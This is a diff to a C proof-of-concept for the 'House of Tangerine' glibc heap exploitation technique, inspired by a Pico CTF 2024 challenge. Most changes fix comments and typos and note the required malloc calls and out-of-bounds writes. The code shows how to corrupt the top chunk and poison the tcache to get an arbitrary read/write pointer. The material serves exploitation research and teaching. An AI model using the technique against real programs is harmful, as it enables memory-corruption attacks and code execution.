@@ -30,7 +30,7 @@
 #define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)
 
 /**
- * Tested on GLIBC 2.31 (x86_64, x86 & aarch64) & 2.27 (x86_64, x86 & aarch64)
+ * Tested on GLIBC 2.27 (x86_64, x86 & aarch64) & 2.31 (x86_64, x86 & aarch64)
  *
  * House of Tangerine is the modernized version of House of Orange
  * and is able to corrupt heap without needing to call free() directly
@@ -42,7 +42,12 @@
  * by abusing the tcache freelist. (requires heap leak on and after 2.32)
  *
  * this version expects a positive and negative OOB (e.g. BOF)
- * or editing a positive OOB in editing a previous chunk
+ * or a positive OOB in editing a previous chunk
+ *
+ * This version requires 5 (6*) malloc calls and 3 OOB
+ *
+ *  *to make the PoC more reliable we need to malloc and probe the current top chunk size,
+ *  this should be predictable in an actual exploit and therefore, can be removed to get 5 malloc calls instead
  *
  * Special Thanks to pepsipu for creating the challenge "High Frequency Trading"
  * from Pico CTF 2024 that inspired this exploitation technique
@@ -68,7 +73,7 @@ int main() {
 
   printf("target tcache top size = 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_SIZE_1);
 
-  // target is malloc chunk aligned 0x10 for x86_64
+  // target is malloc aligned 0x10
   target = ((size_t) win + (MALLOC_ALIGN - 1)) & MALLOC_MASK;
 
   // probe the current size of the top_chunk,
@@ -89,7 +94,7 @@ int main() {
   // first allocation 
   heap_ptr = malloc(size_2);
 
-  // use BOF or OOB to corrupt to the top_chunk
+  // use BOF or OOB to corrupt the top_chunk
   top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];
 
   top_size = *top_size_ptr;
@@ -102,12 +107,15 @@ int main() {
   *top_size_ptr = new_top_size;
   printf("new first top size = 0x%lx\n", new_top_size);
 
+  // remove fencepost from top_chunk, to get size that will be freed
+  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
   freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
   assert(freed_top_size == CHUNK_SIZE_1);
 
   /*
    * malloc (larger than available_top_size), to free previous top_chunk using _int_free.
    * This happens inside sysmalloc, where the top_chunk gets freed if it can't be merged
+   * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
    * we prevent the top_chunk from being merged by lowering its size
    * we can also circumvent corruption checks by keeping PAGE_MASK bits unchanged
    */
@@ -119,13 +127,11 @@ int main() {
   printf("current top size = 0x%lx\n", top_size);
 
   // make sure corrupt top size is page aligned, generally 0x1000
-  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
   new_top_size = top_size & PAGE_MASK;
   heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
   printf("new top size = 0x%lx\n", new_top_size);
 
   // remove fencepost from top_chunk, to get size that will be freed
-  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
   freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
   printf("freed top_chunk size = 0x%lx\n", freed_top_size);
 
@@ -145,7 +151,7 @@ int main() {
   // allocate first tcache (corrupt next tcache bin)
   heap_ptr = malloc(SIZE_1);
 
-  // get arbitary ptr for reads or writes 
+  // get arbitrary ptr for reads or writes
   heap_ptr = malloc(SIZE_1);
 
   // proof that heap_ptr now points to the same string as target
